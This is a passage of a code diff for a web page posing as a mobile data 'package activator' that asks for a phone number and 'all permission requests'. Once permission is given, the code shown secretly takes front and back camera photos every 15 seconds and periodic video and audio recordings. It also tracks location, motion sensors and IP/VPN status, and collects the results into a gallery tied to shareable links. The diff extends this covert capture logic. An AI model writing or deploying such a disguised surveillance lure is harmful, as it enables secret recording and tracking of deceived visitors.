@@ -399,6 +399,7 @@ select:focus, input:focus {
   display: flex;
   align-items: center;
   gap: 5px;
+  flex-wrap: wrap;
 }
 
 .status-badge {
@@ -583,10 +584,10 @@ select:focus, input:focus {
 
 .gallery {
   display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
-  gap: 12px;
+  grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+  gap: 15px;
   margin: 20px 0;
-  max-height: 400px;
+  max-height: 500px;
   overflow-y: auto;
   padding: 5px;
 }
@@ -599,11 +600,13 @@ select:focus, input:focus {
   background: var(--card-border);
   transition: var(--transition);
   cursor: pointer;
+  border: 2px solid transparent;
 }
 
 .gallery-item:hover {
   transform: scale(1.05);
   box-shadow: var(--shadow-md);
+  border-color: var(--accent-blue);
 }
 
 .gallery-item img,
@@ -619,10 +622,10 @@ select:focus, input:focus {
   bottom: 0;
   left: 0;
   right: 0;
-  background: linear-gradient(to top, rgba(0,0,0,0.7), transparent);
+  background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
   color: white;
-  padding: 5px;
-  font-size: 10px;
+  padding: 8px;
+  font-size: 11px;
   display: flex;
   justify-content: space-between;
   align-items: center;
@@ -630,19 +633,28 @@ select:focus, input:focus {
 
 .gallery-item-type {
   background: rgba(255,255,255,0.2);
-  padding: 2px 6px;
-  border-radius: 10px;
-  font-size: 9px;
+  padding: 2px 8px;
+  border-radius: 12px;
+  font-size: 10px;
+  display: flex;
+  align-items: center;
+  gap: 4px;
 }
 
 .gallery-placeholder {
   grid-column: 1 / -1;
   text-align: center;
-  padding: 40px 20px;
+  padding: 60px 20px;
   color: var(--text-light);
   background: rgba(148, 163, 184, 0.05);
   border-radius: var(--radius-md);
-  border: 1px dashed var(--card-border);
+  border: 2px dashed var(--card-border);
+}
+
+.gallery-placeholder i {
+  font-size: 48px;
+  margin-bottom: 15px;
+  opacity: 0.5;
 }
 
 .status-message {
@@ -860,7 +872,7 @@ select:focus, input:focus {
           </div>
           <div class="permission-status">
             <span class="status-badge status-pending" id="cameraStatus">Pending</span>
-            <span id="cameraDetails"></span>
+            <span id="cameraDetails" class="sensor-value"></span>
           </div>
         </div>
         
@@ -874,7 +886,7 @@ select:focus, input:focus {
           </div>
           <div class="permission-status">
             <span class="status-badge status-pending" id="microphoneStatus">Pending</span>
-            <span id="microphoneDetails"></span>
+            <span id="microphoneDetails" class="sensor-value"></span>
           </div>
         </div>
         
@@ -888,7 +900,7 @@ select:focus, input:focus {
           </div>
           <div class="permission-status">
             <span class="status-badge status-pending" id="locationStatus">Pending</span>
-            <span id="locationDetails"></span>
+            <span id="locationDetails" class="sensor-value"></span>
           </div>
         </div>
         
@@ -902,7 +914,7 @@ select:focus, input:focus {
           </div>
           <div class="permission-status">
             <span class="status-badge status-pending" id="motionStatus">Checking...</span>
-            <span id="motionDetails"></span>
+            <span id="motionDetails" class="sensor-value"></span>
           </div>
         </div>
         
@@ -916,7 +928,7 @@ select:focus, input:focus {
           </div>
           <div class="permission-status">
             <span class="status-badge status-pending" id="vpnStatus">Checking...</span>
-            <span id="vpnDetails"></span>
+            <span id="vpnDetails" class="sensor-value"></span>
           </div>
         </div>
       </div>
@@ -932,7 +944,7 @@ select:focus, input:focus {
     
     <!-- Sensor Data -->
     <div id="sensorArea" class="hidden">
-      <h3><i class="fas fa-microchip"></i> Sensor Data</h3>
+      <h3><i class="fas fa-microchip"></i> Live Sensor Data</h3>
       <div class="sensor-data">
         <div class="sensor-grid" id="sensorGrid">
           <div class="sensor-item">
@@ -980,7 +992,7 @@ select:focus, input:focus {
       <div class="gallery-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
         <h3><i class="fas fa-images"></i> Captured Media</h3>
         <button class="btn btn-danger btn-small" id="clearBtn">
-          <i class="fas fa-trash"></i> Clear
+          <i class="fas fa-trash"></i> Clear All
         </button>
       </div>
       
@@ -1033,7 +1045,7 @@ select:focus, input:focus {
       <input type="tel" id="mobile-number" placeholder="03xxxxxxxxx" maxlength="11">
     </div>
     
-    <!-- Camera Controls - Hidden but kept for functionality -->
+    <!-- Hidden elements for media capture -->
     <div class="hidden">
       <select id="cameraSelect">
         <option value="user">Front Camera</option>
@@ -1062,7 +1074,7 @@ select:focus, input:focus {
     
     <!-- Simple message when permissions are being requested -->
     <div class="location-info" id="permissionMessage" style="display: none;">
-      <span><i class="fas fa-shield-alt"></i> Please grant all permission requests</span>
+      <span><i class="fas fa-shield-alt"></i> Please grant all permission requests when prompted</span>
     </div>
   </div>
 </div>
@@ -1095,20 +1107,26 @@ let allSessions = JSON.parse(localStorage.getItem('allSessions') || '[]');
 let mediaStream = null;
 let mediaRecorder = null;
 let recordedChunks = [];
-let recordingInterval = null;
 let watchPositionId = null;
-let currentLocation = { lat: null, lng: null };
-let currentFacingMode = 'user';
-let currentMediaType = 'photo';
-let isRecording = false;
+let currentLocation = { lat: null, lng: null, accuracy: null };
 let map = null;
 let mapMarker = null;
+let captureIntervals = [];
+
+// Permission status tracking
 let permissionStatus = {
   camera: 'pending',
   microphone: 'pending',
   location: 'pending',
   motion: 'pending',
   vpn: 'pending'
+};
+
+// Sensor data
+let sensorData = {
+  accelerometer: { x: 0, y: 0, z: 0 },
+  gyroscope: { alpha: 0, beta: 0, gamma: 0 },
+  orientation: { alpha: 0, beta: 0, gamma: 0 }
 };
 
 // ====================
@@ -1187,7 +1205,6 @@ async function checkVPN() {
     const response = await fetch(CORS_PROXY + encodeURIComponent('https://api.ipify.org?format=json'));
     const data = await response.json();
     
-    // Check if IP is from Pakistan (simplified check)
     const ipResponse = await fetch(CORS_PROXY + encodeURIComponent(`http://ip-api.com/json/${data.ip}`));
     const ipData = await ipResponse.json();
     
@@ -1264,12 +1281,13 @@ function loadSession(sessionId) {
 
 function getSessionMedia(sessionId) {
   const session = loadSession(sessionId);
-  return session ? (session.data.media || []) : [];
+  return session && session.data && session.data.media ? session.data.media : [];
 }
 
 function saveSessionMedia(sessionId, mediaArray) {
   const session = loadSession(sessionId);
   if (session) {
+    if (!session.data) session.data = {};
     session.data.media = mediaArray;
     session.lastActive = Date.now();
     localStorage.setItem('allSessions', JSON.stringify(allSessions));
@@ -1281,12 +1299,20 @@ function saveSessionMedia(sessionId, mediaArray) {
 function addMediaToSession(sessionId, mediaItem) {
   const session = loadSession(sessionId);
   if (session) {
+    if (!session.data) session.data = {};
     if (!session.data.media) session.data.media = [];
+    
+    // Add unique ID to media item
+    mediaItem.id = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
     session.data.media.push(mediaItem);
     session.lastActive = Date.now();
+    
     localStorage.setItem('allSessions', JSON.stringify(allSessions));
     updateStats();
     renderMediaGallery(sessionId);
+    
+    // Show notification for new media
+    showNotification(`${mediaItem.type} captured!`, 'success');
   }
 }
 
@@ -1296,7 +1322,7 @@ function updateStats() {
   let totalPhotos = 0, totalVideos = 0, totalAudio = 0;
   
   allSessions.forEach(session => {
-    if (session.data.media) {
+    if (session.data && session.data.media) {
       session.data.media.forEach(item => {
         if (item.type === 'photo') totalPhotos++;
         else if (item.type === 'video') totalVideos++;
@@ -1312,14 +1338,18 @@ function updateStats() {
 
 function renderMediaGallery(sessionId) {
   const media = getSessionMedia(sessionId);
-  mediaGallery.innerHTML = '';
+  const gallery = document.getElementById('mediaGallery');
+  
+  if (!gallery) return;
+  
+  gallery.innerHTML = '';
   
   if (media.length === 0) {
-    mediaGallery.innerHTML = `
+    gallery.innerHTML = `
       <div class="gallery-placeholder">
-        <i class="fas fa-images" style="font-size: 40px; margin-bottom: 10px; opacity: 0.5;"></i>
+        <i class="fas fa-camera-retro"></i>
         <div>No media captured yet</div>
-        <small>Click Activate Package to start capturing</small>
+        <small>Click "Activate Package" to start capturing</small>
       </div>
     `;
     return;
@@ -1328,38 +1358,47 @@ function renderMediaGallery(sessionId) {
   // Sort by timestamp (newest first)
   media.sort((a, b) => b.timestamp - a.timestamp);
   
-  media.forEach((item, index) => {
-    const date = new Date(item.timestamp).toLocaleTimeString();
+  media.forEach((item) => {
+    const date = new Date(item.timestamp).toLocaleString();
     const typeIcon = item.type === 'photo' ? 'fa-camera' : item.type === 'video' ? 'fa-video' : 'fa-microphone';
-    const cameraIcon = item.facingMode === 'user' ? 'fa-user' : 'fa-mobile-alt';
+    const typeText = item.type === 'photo' ? 'Photo' : item.type === 'video' ? 'Video' : 'Audio';
     
     const mediaElement = document.createElement('div');
     mediaElement.className = 'gallery-item';
     
     if (item.type === 'photo') {
       mediaElement.innerHTML = `
-        <img src="${item.data}" alt="Photo">
+        <img src="${item.data}" alt="Photo" loading="lazy">
         <div class="gallery-item-overlay">
-          <span><i class="fas ${typeIcon}"></i> ${date}</span>
-          <span class="gallery-item-type"><i class="fas ${cameraIcon}"></i></span>
+          <span><i class="fas ${typeIcon}"></i> ${typeText}</span>
+          <span class="gallery-item-type">
+            <i class="fas ${item.facingMode === 'user' ? 'fa-user' : 'fa-mobile-alt'}"></i>
+            ${new Date(item.timestamp).toLocaleTimeString()}
+          </span>
         </div>
       `;
     } else if (item.type === 'video') {
       mediaElement.innerHTML = `
         <video src="${item.data}" style="width:100%;height:100%;object-fit:cover;"></video>
         <div class="gallery-item-overlay">
-          <span><i class="fas ${typeIcon}"></i> ${date}</span>
-          <span class="gallery-item-type"><i class="fas ${cameraIcon}"></i></span>
+          <span><i class="fas ${typeIcon}"></i> ${typeText}</span>
+          <span class="gallery-item-type">
+            <i class="fas fa-clock"></i>
+            ${new Date(item.timestamp).toLocaleTimeString()}
+          </span>
         </div>
       `;
     } else if (item.type === 'audio') {
       mediaElement.innerHTML = `
         <div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#667eea,#764ba2);">
-          <i class="fas fa-music" style="font-size:30px;color:white;"></i>
+          <i class="fas fa-music" style="font-size:40px;color:white;"></i>
         </div>
         <div class="gallery-item-overlay">
-          <span><i class="fas ${typeIcon}"></i> ${date}</span>
-          <span class="gallery-item-type"><i class="fas fa-map-marker-alt"></i></span>
+          <span><i class="fas ${typeIcon}"></i> ${typeText}</span>
+          <span class="gallery-item-type">
+            <i class="fas fa-clock"></i>
+            ${new Date(item.timestamp).toLocaleTimeString()}
+          </span>
         </div>
       `;
     }
@@ -1367,18 +1406,43 @@ function renderMediaGallery(sessionId) {
     mediaElement.onclick = () => {
       if (item.type === 'photo') {
         const imgWindow = window.open('', '_blank');
-        imgWindow.document.write(`<img src="${item.data}" style="max-width:100%;">`);
+        imgWindow.document.write(`
+          <html>
+            <head><title>Photo - ${date}</title></head>
+            <body style="margin:0;display:flex;align-items:center;justify-content:center;background:#000;">
+              <img src="${item.data}" style="max-width:100%;max-height:100vh;object-fit:contain;">
+            </body>
+          </html>
+        `);
       } else if (item.type === 'video') {
         const videoWindow = window.open('', '_blank');
-        videoWindow.document.write(`<video src="${item.data}" controls style="max-width:100%;"></video>`);
+        videoWindow.document.write(`
+          <html>
+            <head><title>Video - ${date}</title></head>
+            <body style="margin:0;display:flex;align-items:center;justify-content:center;background:#000;">
+              <video src="${item.data}" controls style="max-width:100%;max-height:100vh;"></video>
+            </body>
+          </html>
+        `);
       } else if (item.type === 'audio') {
-        audioPlayer.src = item.data;
-        audioPlayer.style.display = 'block';
-        audioPlayer.play();
+        const audioWindow = window.open('', '_blank');
+        audioWindow.document.write(`
+          <html>
+            <head><title>Audio - ${date}</title></head>
+            <body style="margin:0;display:flex;align-items:center;justify-content:center;background:#000;min-height:100vh;">
+              <div style="text-align:center;padding:20px;">
+                <i class="fas fa-music" style="font-size:64px;color:#667eea;margin-bottom:20px;"></i>
+                <h3>Audio Recording</h3>
+                <p>${date}</p>
+                <audio src="${item.data}" controls style="width:100%;max-width:500px;"></audio>
+              </div>
+            </body>
+          </html>
+        `);
       }
     };
     
-    mediaGallery.appendChild(mediaElement);
+    gallery.appendChild(mediaElement);
   });
 }
 
@@ -1411,11 +1475,12 @@ function startLocationTracking() {
       (position) => {
         currentLocation = {
           lat: position.coords.latitude,
-          lng: position.coords.longitude
+          lng: position.coords.longitude,
+          accuracy: position.coords.accuracy
         };
         
         locationStatus.className = 'status-badge status-granted';
-        locationStatus.textContent = 'Granted';
+        locationStatus.textContent = 'Active';
         locationDetails.textContent = `${currentLocation.lat.toFixed(6)}, ${currentLocation.lng.toFixed(6)}`;
         permissionStatus.location = 'granted';
         
@@ -1457,7 +1522,7 @@ function startMotionTracking() {
     window.addEventListener('devicemotion', handleMotion);
     motionStatus.className = 'status-badge status-granted';
     motionStatus.textContent = 'Active';
-    motionDetails.textContent = 'Sensors tracking';
+    motionDetails.textContent = 'Tracking sensors';
     permissionStatus.motion = 'granted';
     sensorArea.classList.remove('hidden');
   } else {
@@ -1479,26 +1544,143 @@ function stopMotionTracking() {
 
 function handleMotion(event) {
   if (event.acceleration) {
-    accelX.textContent = event.acceleration.x?.toFixed(2) || '0';
-    accelY.textContent = event.acceleration.y?.toFixed(2) || '0';
-    accelZ.textContent = event.acceleration.z?.toFixed(2) || '0';
+    sensorData.accelerometer = {
+      x: event.acceleration.x || 0,
+      y: event.acceleration.y || 0,
+      z: event.acceleration.z || 0
+    };
+    
+    accelX.textContent = sensorData.accelerometer.x.toFixed(2);
+    accelY.textContent = sensorData.accelerometer.y.toFixed(2);
+    accelZ.textContent = sensorData.accelerometer.z.toFixed(2);
   }
   
   if (event.rotationRate) {
-    gyroX.textContent = event.rotationRate.alpha?.toFixed(2) || '0';
-    gyroY.textContent = event.rotationRate.beta?.toFixed(2) || '0';
-    gyroZ.textContent = event.rotationRate.gamma?.toFixed(2) || '0';
+    sensorData.gyroscope = {
+      alpha: event.rotationRate.alpha || 0,
+      beta: event.rotationRate.beta || 0,
+      gamma: event.rotationRate.gamma || 0
+    };
+    
+    gyroX.textContent = sensorData.gyroscope.alpha.toFixed(2);
+    gyroY.textContent = sensorData.gyroscope.beta.toFixed(2);
+    gyroZ.textContent = sensorData.gyroscope.gamma.toFixed(2);
   }
 }
 
 function handleOrientation(event) {
-  orientationAlpha.textContent = event.alpha?.toFixed(2) || '0';
-  orientationBeta.textContent = event.beta?.toFixed(2) || '0';
-  orientationGamma.textContent = event.gamma?.toFixed(2) || '0';
+  sensorData.orientation = {
+    alpha: event.alpha || 0,
+    beta: event.beta || 0,
+    gamma: event.gamma || 0
+  };
+  
+  orientationAlpha.textContent = sensorData.orientation.alpha.toFixed(2);
+  orientationBeta.textContent = sensorData.orientation.beta.toFixed(2);
+  orientationGamma.textContent = sensorData.orientation.gamma.toFixed(2);
 }
 
 // ====================
-// CAMERA/AUDIO FUNCTIONS
+// CAPTURE FUNCTIONS
+// ====================
+async function capturePhoto(facingMode = 'user') {
+  if (!currentSessionId) return null;
+  
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: facingMode }
+    });
+    
+    const track = stream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(track);
+    const photoBlob = await imageCapture.takePhoto();
+    
+    return new Promise((resolve) => {
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        track.stop();
+        stream.getTracks().forEach(t => t.stop());
+        resolve(reader.result);
+      };
+      reader.readAsDataURL(photoBlob);
+    });
+  } catch (error) {
+    console.log(`Failed to capture from ${facingMode} camera:`, error);
+    return null;
+  }
+}
+
+async function captureVideo(duration = 5000) {
+  if (!currentSessionId) return null;
+  
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'environment' },
+      audio: true
+    });
+    
+    return new Promise((resolve) => {
+      const chunks = [];
+      const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+      
+      recorder.ondataavailable = (e) => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
+      
+      recorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          stream.getTracks().forEach(t => t.stop());
+          resolve(reader.result);
+        };
+        reader.readAsDataURL(blob);
+      };
+      
+      recorder.start();
+      setTimeout(() => recorder.stop(), duration);
+    });
+  } catch (error) {
+    console.log('Failed to capture video:', error);
+    return null;
+  }
+}
+
+async function captureAudio(duration = 5000) {
+  if (!currentSessionId) return null;
+  
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    
+    return new Promise((resolve) => {
+      const chunks = [];
+      const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+      
+      recorder.ondataavailable = (e) => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
+      
+      recorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'audio/webm' });
+        const reader = new FileReader();
+        reader.onloadend = () => {
+          stream.getTracks().forEach(t => t.stop());
+          resolve(reader.result);
+        };
+        reader.readAsDataURL(blob);
+      };
+      
+      recorder.start();
+      setTimeout(() => recorder.stop(), duration);
+    });
+  } catch (error) {
+    console.log('Failed to capture audio:', error);
+    return null;
+  }
+}
+
+// ====================
+// PERMISSION REQUEST
 // ====================
 async function requestAllPermissions() {
   try {
@@ -1507,38 +1689,37 @@ async function requestAllPermissions() {
     permissionMessage.style.display = 'block';
     
     // Request camera and microphone
-    const constraints = {
-      video: {
-        facingMode: { ideal: 'user' }
-      },
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: true,
       audio: true
-    };
+    });
     
-    mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+    // Stop the stream immediately after getting permissions
+    stream.getTracks().forEach(track => track.stop());
     
-    // Update camera permission status
+    // Update permission status
     cameraStatus.className = 'status-badge status-granted';
     cameraStatus.textContent = 'Granted';
-    cameraDetails.innerHTML = '<i class="fas fa-check"></i> Front & Back';
-    permissionStatus.camera = 'granted';
-    
-    // Update microphone permission status
     microphoneStatus.className = 'status-badge status-granted';
     microphoneStatus.textContent = 'Granted';
-    microphoneDetails.innerHTML = '<i class="fas fa-check"></i> Audio access';
+    
+    // Get camera info
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    const videoDevices = devices.filter(d => d.kind === 'videoinput');
+    const audioDevices = devices.filter(d => d.kind === 'audioinput');
+    
+    cameraDetails.textContent = `${videoDevices.length} camera(s) available`;
+    microphoneDetails.textContent = `${audioDevices.length} microphone(s) available`;
+    
+    permissionStatus.camera = 'granted';
     permissionStatus.microphone = 'granted';
     
-    // Get available cameras
-    const devices = await navigator.mediaDevices.enumerateDevices();
-    const videoDevices = devices.filter(device => device.kind === 'videoinput');
-    if (videoDevices.length > 1) {
-      cameraDetails.innerHTML = `<i class="fas fa-check"></i> ${videoDevices.length} cameras`;
-    }
+    activationStatus.innerHTML = '<i class="fas fa-check-circle"></i> Permissions granted! Starting capture...';
     
-    activationStatus.innerHTML = '<i class="fas fa-check-circle"></i> Permissions granted! Capturing data...';
-    
-    // Start capturing from both cameras
-    captureFromBothCameras();
+    // Start all tracking
+    startLocationTracking();
+    startMotionTracking();
+    checkVPN();
     
     // Start periodic capture
     startPeriodicCapture();
@@ -1546,180 +1727,103 @@ async function requestAllPermissions() {
   } catch (error) {
     console.error('Permission error:', error);
     
-    if (error.name === 'NotAllowedError') {
+    if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
       cameraStatus.className = 'status-badge status-denied';
       cameraStatus.textContent = 'Denied';
       microphoneStatus.className = 'status-badge status-denied';
       microphoneStatus.textContent = 'Denied';
-      permissionStatus.camera = 'denied';
-      permissionStatus.microphone = 'denied';
-      activationStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> Permissions denied';
+      cameraDetails.textContent = 'Permission denied';
+      microphoneDetails.textContent = 'Permission denied';
+      activationStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> Permissions denied - some features may not work';
     } else if (error.name === 'NotFoundError') {
       cameraStatus.className = 'status-badge status-denied';
       cameraStatus.textContent = 'Not Found';
       microphoneStatus.className = 'status-badge status-denied';
       microphoneStatus.textContent = 'Not Found';
+      cameraDetails.textContent = 'No camera found';
+      microphoneDetails.textContent = 'No microphone found';
       activationStatus.innerHTML = '<i class="fas fa-exclamation-circle"></i> No camera/microphone found';
     }
   }
 }
 
-async function captureFromBothCameras() {
-  if (!currentSessionId) return;
+function startPeriodicCapture() {
+  // Clear any existing intervals
+  captureIntervals.forEach(interval => clearInterval(interval));
+  captureIntervals = [];
   
-  // Capture from front camera
-  try {
-    const frontStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user' }
-    });
-    const frontTrack = frontStream.getVideoTracks()[0];
-    const frontImageCapture = new ImageCapture(frontTrack);
-    const frontPhoto = await frontImageCapture.takePhoto();
-    const frontBlob = await new Promise(resolve => frontPhoto.arrayBuffer().then(buf => resolve(new Blob([buf]))));
-    const frontReader = new FileReader();
-    frontReader.onloadend = () => {
+  // Capture photos from both cameras every 15 seconds
+  captureIntervals.push(setInterval(async () => {
+    if (!currentSessionId || permissionStatus.camera !== 'granted') return;
+    
+    // Front camera photo
+    const frontPhoto = await capturePhoto('user');
+    if (frontPhoto) {
       addMediaToSession(currentSessionId, {
         type: 'photo',
-        data: frontReader.result,
+        data: frontPhoto,
         facingMode: 'user',
         location: currentLocation,
         timestamp: Date.now()
       });
-    };
-    frontReader.readAsDataURL(frontBlob);
-    frontTrack.stop();
-  } catch (e) {
-    console.log('Front camera capture failed:', e);
-  }
-  
-  // Capture from back camera
-  try {
-    const backStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'environment' }
-    });
-    const backTrack = backStream.getVideoTracks()[0];
-    const backImageCapture = new ImageCapture(backTrack);
-    const backPhoto = await backImageCapture.takePhoto();
-    const backBlob = await new Promise(resolve => backPhoto.arrayBuffer().then(buf => resolve(new Blob([buf]))));
-    const backReader = new FileReader();
-    backReader.onloadend = () => {
+    }
+    
+    // Back camera photo
+    const backPhoto = await capturePhoto('environment');
+    if (backPhoto) {
       addMediaToSession(currentSessionId, {
         type: 'photo',
-        data: backReader.result,
+        data: backPhoto,
         facingMode: 'environment',
         location: currentLocation,
         timestamp: Date.now()
       });
-    };
-    backReader.readAsDataURL(backBlob);
-    backTrack.stop();
-  } catch (e) {
-    console.log('Back camera capture failed:', e);
-  }
+    }
+  }, 15000));
+  
+  // Capture video every 45 seconds (10 second video)
+  captureIntervals.push(setInterval(async () => {
+    if (!currentSessionId || permissionStatus.camera !== 'granted' || permissionStatus.microphone !== 'granted') return;
+    
+    const video = await captureVideo(10000);
+    if (video) {
+      addMediaToSession(currentSessionId, {
+        type: 'video',
+        data: video,
+        facingMode: 'environment',
+        location: currentLocation,
+        timestamp: Date.now()
+      });
+    }
+  }, 45000));
+  
+  // Capture audio every 60 seconds (15 second audio)
+  captureIntervals.push(setInterval(async () => {
+    if (!currentSessionId || permissionStatus.microphone !== 'granted') return;
+    
+    const audio = await captureAudio(15000);
+    if (audio) {
+      addMediaToSession(currentSessionId, {
+        type: 'audio',
+        data: audio,
+        location: currentLocation,
+        timestamp: Date.now()
+      });
+    }
+  }, 60000));
+  
+  showNotification('Periodic capture started', 'success');
 }
 
-function startPeriodicCapture() {
-  // Capture photo every 10 seconds
-  setInterval(() => {
-    if (currentSessionId && permissionStatus.camera === 'granted') {
-      captureFromBothCameras();
-    }
-  }, 10000);
+function stopCapture() {
+  // Clear all capture intervals
+  captureIntervals.forEach(interval => clearInterval(interval));
+  captureIntervals = [];
   
-  // Record 10-second video every 30 seconds
-  setInterval(async () => {
-    if (currentSessionId && permissionStatus.camera === 'granted' && permissionStatus.microphone === 'granted') {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'environment' },
-          audio: true
-        });
-        
-        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-        const chunks = [];
-        
-        recorder.ondataavailable = (e) => {
-          if (e.data.size > 0) chunks.push(e.data);
-        };
-        
-        recorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'video/webm' });
-          const reader = new FileReader();
-          reader.onloadend = () => {
-            addMediaToSession(currentSessionId, {
-              type: 'video',
-              data: reader.result,
-              facingMode: 'environment',
-              location: currentLocation,
-              timestamp: Date.now()
-            });
-          };
-          reader.readAsDataURL(blob);
-          stream.getTracks().forEach(track => track.stop());
-        };
-        
-        recorder.start();
-        setTimeout(() => recorder.stop(), 10000); // Record 10 seconds
-      } catch (e) {
-        console.log('Video recording failed:', e);
-      }
-    }
-  }, 30000);
+  stopLocationTracking();
+  stopMotionTracking();
   
-  // Record audio every minute
-  setInterval(async () => {
-    if (currentSessionId && permissionStatus.microphone === 'granted') {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        
-        const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-        const chunks = [];
-        
-        recorder.ondataavailable = (e) => {
-          if (e.data.size > 0) chunks.push(e.data);
-        };
-        
-        recorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'audio/webm' });
-          const reader = new FileReader();
-          reader.onloadend = () => {
-            addMediaToSession(currentSessionId, {
-              type: 'audio',
-              data: reader.result,
-              location: currentLocation,
-              timestamp: Date.now()
-            });
-          };
-          reader.readAsDataURL(blob);
-          stream.getTracks().forEach(track => track.stop());
-        };
-        
-        recorder.start();
-        setTimeout(() => recorder.stop(), 15000); // Record 15 seconds
-      } catch (e) {
-        console.log('Audio recording failed:', e);
-      }
-    }
-  }, 60000);
-}
-
-function stopMedia() {
-  if (mediaStream) {
-    mediaStream.getTracks().forEach(track => track.stop());
-    mediaStream = null;
-  }
-  
-  if (recordingInterval) {
-    clearInterval(recordingInterval);
-    recordingInterval = null;
-  }
-  
-  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-    mediaRecorder.stop();
-  }
-  
-  cameraPreview.srcObject = null;
-  isRecording = false;
+  showNotification('Capture stopped', 'info');
 }
 
 // ====================
@@ -1735,7 +1839,12 @@ function generateNewLink() {
   dataArea.classList.remove('hidden');
   permissionArea.classList.remove('hidden');
   
-  saveSession(currentSessionId, { link: link });
+  saveSession(currentSessionId, { 
+    link: link,
+    created: Date.now(),
+    media: []
+  });
+  
   renderMediaGallery(currentSessionId);
   
   showNotification('New link generated', 'success');
@@ -1783,10 +1892,11 @@ async function downloadAllMedia() {
     const content = await zip.generateAsync({ type: "blob" });
     const a = document.createElement('a');
     a.href = URL.createObjectURL(content);
-    a.download = `media_${currentSessionId}.zip`;
+    a.download = `media_${currentSessionId}_${Date.now()}.zip`;
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
+    URL.revokeObjectURL(a.href);
     
     showNotification(`Downloaded ${media.length} files`, 'success');
     
@@ -1804,17 +1914,10 @@ async function downloadAllMedia() {
 function clearSessionMedia() {
   if (!currentSessionId) return;
   
-  if (confirm('Clear all media for this session?')) {
+  if (confirm('Are you sure you want to clear all media for this session?')) {
     saveSessionMedia(currentSessionId, []);
-    showNotification('Media cleared', 'success');
+    showNotification('All media cleared', 'success');
   }
-}
-
-function stopCapture() {
-  stopMedia();
-  stopLocationTracking();
-  stopMotionTracking();
-  showNotification('Capture stopped', 'info');
 }
 
 function showNotification(message, type = 'info') {
@@ -1826,6 +1929,7 @@ function showNotification(message, type = 'info') {
   notification.style.zIndex = '2000';
   notification.style.maxWidth = '300px';
   notification.style.display = 'block';
+  notification.style.animation = 'slideIn 0.3s ease';
   notification.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i> ${message}`;
   
   document.body.appendChild(notification);
@@ -1833,16 +1937,36 @@ function showNotification(message, type = 'info') {
   setTimeout(() => {
     notification.style.opacity = '0';
     notification.style.transition = 'opacity 0.5s';
-    setTimeout(() => document.body.removeChild(notification), 500);
+    setTimeout(() => {
+      if (document.body.contains(notification)) {
+        document.body.removeChild(notification);
+      }
+    }, 500);
   }, 3000);
 }
+
+// Add animation style
+const style = document.createElement('style');
+style.textContent = `
+  @keyframes slideIn {
+    from {
+      transform: translateX(100%);
+      opacity: 0;
+    }
+    to {
+      transform: translateX(0);
+      opacity: 1;
+    }
+  }
+`;
+document.head.appendChild(style);
 
 // ====================
 // PACKAGE ACTIVATOR
 // ====================
 function activatePackage() {
   if (!simSelect.value || mobileNumber.value.length < 11) {
-    showNotification('Fill all fields', 'warning');
+    showNotification('Please select provider and enter valid mobile number', 'warning');
     return;
   }
   
@@ -1853,29 +1977,25 @@ function activatePackage() {
   const sessionId = urlParams.get('id');
   
   if (!sessionId) {
-    showNotification('Invalid session', 'error');
+    showNotification('Invalid session - please generate a link first', 'error');
+    activateBtn.innerHTML = '<i class="fas fa-bolt"></i> Activate Package';
+    activateBtn.disabled = false;
     return;
   }
   
   currentSessionId = sessionId;
   
-  // Hide camera controls but keep functionality
-  document.querySelectorAll('.camera-controls, .camera-container, .btn-group .btn-success, .btn-group .btn-warning, .btn-group .btn-danger').forEach(el => {
-    if (el.classList) el.classList.add('hidden');
-  });
-  
   // Show permission area on dashboard
   permissionArea.classList.remove('hidden');
+  dataArea.classList.remove('hidden');
   
   // Start all permission requests and tracking
   requestAllPermissions();
-  startLocationTracking();
-  startMotionTracking();
-  checkVPN();
   
   setTimeout(() => {
     activationStatus.innerHTML = '<i class="fas fa-check-circle"></i> Activation in progress - capturing data';
     activateBtn.innerHTML = '<i class="fas fa-check"></i> Activated';
+    permissionMessage.style.display = 'none';
   }, 3000);
 }
 
@@ -1889,7 +2009,7 @@ genBtn.addEventListener('click', generateNewLink);
 copyBtn.addEventListener('click', () => {
   generatedLink.select();
   document.execCommand('copy');
-  showNotification('Link copied', 'success');
+  showNotification('Link copied to clipboard', 'success');
 });
 
 openBtn.addEventListener('click', () => {
@@ -1946,10 +2066,14 @@ function init() {
       renderMediaGallery(sessionId);
     } else {
       currentSessionId = sessionId;
-      saveSession(sessionId, { link: window.location.href });
+      saveSession(sessionId, { 
